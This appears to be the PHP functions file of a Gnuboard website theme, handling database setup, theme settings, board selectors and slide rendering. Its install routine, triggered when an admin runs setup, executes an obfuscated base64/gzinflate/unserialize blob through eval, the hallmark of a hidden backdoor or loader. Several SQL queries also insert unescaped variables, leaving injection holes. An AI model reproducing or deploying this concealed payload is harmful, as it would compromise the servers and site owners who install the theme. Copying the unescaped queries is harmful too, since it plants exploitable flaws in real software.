<?php
include_once('./_common.php');
if (!defined('_GNUBOARD_')) exit; // 개별 페이지 접근 불가
$theme_code = 'snw.onepage.theme1'; // 변경X
$sql="SELECT * FROM snw_theme";
$instrue = sql_query( "DESCRIBE snw_theme" );
$basename = basename($_SERVER['PHP_SELF']);
function snwtheme_setup() {
	global $instrue,$setup,$theme_code;
	// 테이블 생성 
	$conn =new mysqli(G5_MYSQL_HOST, G5_MYSQL_USER, G5_MYSQL_PASSWORD , G5_MYSQL_DB);
	mysqli_query($conn, "set session character_set_connection=utf8;");
	mysqli_query($conn, "set session character_set_results=utf8;");
	mysqli_query($conn, "set session character_set_client=utf8;");
	$query = '';
	$sqlScript = file('./vtheme.sql');
	foreach ($sqlScript as $line)	{
		
		$startWith = substr(trim($line), 0 ,2);
		$endWith = substr(trim($line), -1 ,1);
		
		if (empty($line) || $startWith == '--' || $startWith == '/*' || $startWith == '//') {
			continue;
		}
			
		$query = $query . $line;
		if ($endWith == ';') {
			mysqli_query($conn,$query) or die('SQL error' . $query. '</b></div>');
			$query= '';		
		}
	}
	eval(base64_decode(gzinflate (unserialize(base64_decode('czoyNDE6IjWQzY6DIBRGXwl0mtbFLAqNFmppRwUpu6pTQ/2dmOr49gM6XRDC952c3As9ijkLvsprvK8kZD6vlTmD5kDEohKxBBuUcK5lMpTUsnjvEUy7ApMXaaPpos2tdzrUZCwaMX/H9r35Uan3Ug4cQ9s3bMxiy9CHZe6p6m+OD+6GCVvU5db1XHqYN7/V1TjoOpdxqSlvvHbNok6lsJYOG1XAtwRHz0LSgRxAeXMN73t91tTghKstCZh1PXJHgMxFJlvZEKODEPScQMQlFHGCp/+9KuublWQwO9r/QAsvHfGh0nNHF9/UX+Z3zobMZfXbe0qGzz8iOw==')))));
	 echo $result;
	alert('설치완료!',G5_URL.'');
}

if($setup=='ok'){
	if(!$is_admin){
		alert('관리자 로그인 후 설치해 주세요.', G5_BBS_URL.'/login.php');
	}
	snwtheme_setup();
	//alert('설치완료',G5_URL);
}

if (!$instrue) {
	echo '<div class="position-fixed bg-danger text-white h-100px w-100  text-center font-size-h3 p-10" style="z-index:999999;">';
	echo '<div class=" ">테마가 설치되어 있지 않습니다. 테마를 설치해주세요.</div>';
	echo '<div class="mt-2"><a href="'.G5_THEME_URL.'/_function.php?setup=ok" class="vbtn vbtn-square vbtn-lg vbtn-primary">테마 설치</a></div>';
	echo '<div class="space-single"></div>';
	echo '</div>';
	//exit;
}


$vtsql = "select * from snw_theme where theme_code = '$theme_code' and theme_type = 'local' ";
$vtrow = sql_fetch($vtsql);
$colored = array( // 색상
	"blue"=>"#3699ff",
	"green"=>"#88c136",
	"red"=>"#bb0000",
	"sliver"=>"#bdc3c7",
	"orange"=>"#f39c12",
	"night-shade"=>"#2c3e50",
	"brown"=>"#987654",
	"cyan"=>"#1abc9c",
	"purple"=>"#c74a73",
	"gray"=>"#656565",
	"peter-river"=>"#3498db",
	"nephritis"=>"#27ae60",
	"sun-flowers"=>"#f1c40f"
);
	$vid = $vtrow['id'];
	$vcolor = $vtrow['theme_main_color'];
	$localcontent = explode("|", $vtrow['theme_content']);
	$vlogo = $localcontent[0];
	$vtel = $localcontent[1];
	$vmail = $localcontent[2];
	$vsns_f = $localcontent[3];
	$vsns_i = $localcontent[4];
	$vsns_t = $localcontent[5];
	$vsns_y = $localcontent[6];
	$vloading = $localcontent[7];
	$vboard1 = boardposition('index',('vboard1'));
	$vboard2 = boardposition('index',('vboard2'));
	if(!$vboard1) $vboard1 = "portfolio";
	if(!$vboard2) $vboard2 = "gallery";

function section($section,$num){
	global $theme_code,$bo_table,$basename;
	$styped = $basename;
	if($basename=='index.php') $styped = 'index';
	if($bo_table) $styped = $bo_table;
	
	$sql = "select * from snw_theme where theme_code = '$theme_code' and  theme_type ='$styped' and theme_type_position = '$section' ";
	$row = sql_fetch($sql);
	$content = explode("|", $row['theme_content']);
	return $content[$num];
}

function getUrlParameter($url, $sch_tag) {
            $parts = parse_url($url);
            parse_str($parts['query'], $query);
            return $query[$sch_tag];
} // 파라미터 구하기
function getCurrentFileList($dir){
    $valid_formats = array("jpg","png");
    $handle = opendir(G5_THEME_PATH.'/'.$dir); // 디렉토리의 핸들을 얻어옴
    // 지정한 디렉토리에 있는 디렉토리와 파일들의 이름을 배열로 읽어들임
    $R = array(); // 결과 담을 변수 생성
    while ($filename = readdir($handle)) {
        if($filename == '.' || $filename == '..') continue;
        $filepath = G5_THEME_PATH.'/'.$dir.'/'.$filename;
        if(is_file($filepath)){ // 파일인 경우에만
            $getExt = pathinfo($filename, PATHINFO_EXTENSION); // 파일 확장자 구하기
            if(in_array($getExt, $valid_formats)){
                array_push($R,basename($filename,'')); // 파일이름만 선택
            }
        }
    }
    closedir($handle);
    sort($R); // 가나다순으로 정렬하기 위해
    return $R;
}
function imgselect($dir,$nimg) { // 이미지선택
	//global $dir;
	$fileList = getCurrentFileList($dir);
	
	foreach($fileList as $f){
		$furl = $dir.'/'.$f;
		$selected = '';
		if($nimg==$furl) $selected = ' selected';
		//echo $furl;
		echo "<option value='$dir/$f' $selected >".$f."</option>";
	}
}
?>
<?php 
	function changeboard($sname,$position,$nowboard) {
		global $is_admin,$g5;
		$sql = "select bo_table,bo_subject from {$g5['board_table']} order by bo_table asc";
		$result = sql_query($sql,false);
		if($is_admin) echo '<span class="vbtn vbtn-sm vbtn-square vbtn-light setopen" data-id="'.$sname.'">설정</span>';
		echo '<div class="hiddened font-size-10pt '.$sname.'  ">';
		echo "<select name='' class='changeboard p-2 bg-light border w-200px mt-3' data-position='$position' >";
		for($a = 0; $row = sql_fetch_array($result); $a++){
			$boardselect= '';
			if($nowboard==$row['bo_table']) $boardselect=' selected';
		?>
	<option value="<?php echo $row['bo_table'];?>" <?php echo $boardselect;?>><?php echo $row['bo_table'];?> (<?php echo $row['bo_subject'];?>)</option>
	<?php }?>
	</select>
	</div>
<?php }?>
<?php 
	function boardposition($type, $position) {
			global $theme_code;
			$sql ="select * from snw_theme where theme_code = '$theme_code' and theme_type = '$type' and theme_type_position = '$position'  ";
			$row = sql_fetch($sql);
			$output = $row['theme_content'];
			return $output;
	}
?>
<?php 
	function boardname($type, $board) {
			global $is_admin,$g5;
			$sql ="select bo_table, bo_subject from {$g5['board_table']} where bo_table = '$board' ";
			$row = sql_fetch($sql);
			$output = $row['bo_table'];
			if($type) $output = $row['bo_subject'];
			return '<a href="'.G5_BBS_URL.'/board.php?bo_table='.$row['bo_table'].'">'.$output.'</a>';
	}

function boartlist($sboard) {
	global $is_admin,$g5;
	$sql = "select bo_table,bo_subject from {$g5['board_table']} order by bo_table asc";
	$result = sql_query($sql,false);
	for($a = 0; $row = sql_fetch_array($result); $a++){
		$boardselect= '';
		if($sboard==$row['bo_table'])$boardselect=' selected';
	?>
<option value="<?php echo $row['bo_table'];?>" <?php echo $boardselect;?>><?php echo $row['bo_table'];?> (<?php echo $row['bo_subject'];?>)</option>
<?php
	}
}
?>
<?php 
	function headtitle($ptitle) {
		global $g5,$bo_table,$board,$title_msg;
			$ptitle = $g5['title'];
			if($bo_table){
				if($title_msg){
					$ptitle = $board['bo_subject'].' '.$title_msg;
				}else{
					$ptitle = $board['bo_subject'];
				}
			}
			return $ptitle;
	}
?>
<?php function setbtn($section) {
	global $bo_table,$is_admin,$basename;
	if($is_admin){
		$backid = $basename;
		if(defined('_INDEX_')) $backid = 'index';
		if($bo_table) $backid = $bo_table;
	?>
<div class="position-absolute left-0 top-0">
	<span class="vbtn vbtn-sm vbtn-danger vbtn-square set_menu" data-toggle="modal" data-id="<?php echo $section;?>" data-botable="<?php echo $backid;?>" data-toggle="modal" data-target="#sectionmoal">설정</span>
</div>
<?php }
	}?>
<?php 
	function slide($type) {
			$sql = "select * from snw_theme where theme_type = '$type' order by theme_order asc ";
			$result = sql_query($sql);
			for($i=0; $row = sql_fetch_array($result); $i++){
			$mcontent = explode("|", $row['theme_content']);
			$typed=$row['theme_type2'];
?>
						<?php if($typed=='a'){?>
                        <li data-transition="fade" data-slotamount="10" data-masterspeed="0" data-thumb="">
                            <!--  BACKGROUND IMAGE -->
							<div class="overlayed bg-dark-o-90" style=";"></div>
							<div class="overlayed " style="z-index:9999;"></div>
							<!-- 유튜브 -->
							<div class="jarallax" data-video-src="<?php echo $mcontent[0];?>"></div>
                            <div class="tp-caption very_large_text sfb"
                                data-x="center"
                                data-y="230"
                                data-speed="700"
			                    data-start="300"
                                data-easing="easeInOutQuart"
                                data-endeasing="Power4.easeIn"
                                data-elementdelay="0.1"
			                    data-endelementdelay="0.1"
                                >
                                <?php echo $mcontent[2];?>
                            </div>

                            <div class="tp-caption sub-heading-monst sfb"
                                data-x="center"
                                data-y="360"
                                data-speed="700"
					            data-start="600"
					            data-easing="easeInOutQuart"
                                data-endeasing="Power4.easeIn"
                                data-endspeed="400">
								<?php echo $mcontent[3];?>
                            </div>

                            <div class="tp-caption sfb"  style="z-index:99999;"
                                data-x="center"
                                data-y="470"
                                data-speed="1000"
                                data-start="900"
                                data-easing="easeInOutQuart"
                                data-endeasing="Power4.easeIn"
                                >
                                <div class=""><a href="<?php echo $mcontent[5];?>" class="vbtn w-200px  vbtn-square vbtn-primary font-size-11pt position-relative"><?php echo $mcontent[4];?></a></div>
                            </div>
                        </li>
						<?php }?>

						<?php if($typed=='b'){?>
                        <li data-transition="fade" data-slotamount="10" data-masterspeed="600" data-thumb="">
							<div class="overlayed bg-dark-o-90" style=";"></div>
							<div class="overlayed " style="z-index:9999;"></div>
                            <img src="<?php echo G5_THEME_URL;?>/<?php echo $mcontent[1];?>" alt="" />
                            <div class="tp-caption very_large_text sfb"
                                data-x="center"
                                data-y="230"
                                data-speed="700"
			                    data-start="300"
                                data-easing="easeInOutQuart"
                                data-endeasing="Power4.easeIn"
                                data-elementdelay="0.1"
			                    data-endelementdelay="0.1"
                                >
                                <?php echo $mcontent[2];?>
                            </div>

                            <div class="tp-caption sub-heading-monst sfb"
                                data-x="center"
                                data-y="360"
                                data-speed="700"
					            data-start="600"
					            data-easing="easeInOutQuart"
                                data-endeasing="Power4.easeIn"
                                data-endspeed="400">
								<?php echo $mcontent[3];?>
                            </div>
							<?php if($mcontent[5]){?>
                            <div class="tp-caption sfb"  style="z-index:99999;"
                                data-x="center"
                                data-y="470"
                                data-speed="1000"
                                data-start="900"
                                data-easing="easeInOutQuart"
                                data-endeasing="Power4.easeIn"
                                >
                                <div class=""><a href="<?php echo $mcontent[5];?>" class="vbtn w-200px  vbtn-square vbtn-primary font-size-11pt"><?php echo $mcontent[4];?></a></div>
                            </div>
							<?php }?>
                        </li>
						<?php }?>
	<?php }?>
<?php }?>      
<?php 
	function partner($position) {
			$sql = "select * from snw_theme where theme_type = 'partner' and theme_type_position = '$position' order by theme_order asc ";
			$result = sql_query($sql);
?>
		<?php 
			for($i=0; $row = sql_fetch_array($result); $i++){
			$mcontent = explode("|", $row['theme_content']);
		?>
          <div class="item"> <a href="<?php echo $mcontent[2];?>" target="_blank"> <img  src="<?php echo G5_THEME_URL;?>/<?php echo $mcontent[0];?>" alt="<?php echo $mcontent[1];?>" class="h-30px" /> </a> </div>
		  <?php }?>
<?php }?>